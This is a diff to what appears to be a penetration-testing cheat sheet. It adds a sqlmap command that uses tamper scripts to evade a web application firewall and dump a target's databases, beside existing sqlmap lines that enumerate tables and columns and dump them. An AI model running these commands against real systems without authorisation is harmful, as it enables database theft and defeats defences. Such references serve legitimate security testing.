@@ -41,6 +41,7 @@
 > sqlmap -r req.txt -D DBName --tables<br/>
 > sqlmap -r req.txt -D DBName --tables --columns<br/>
 > sqlmap -r req.txt -D DBName --dump<br/>
+> WAF: sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
 
 ## WordPress <br/>
 > <b>WP SCAN</b><br/>
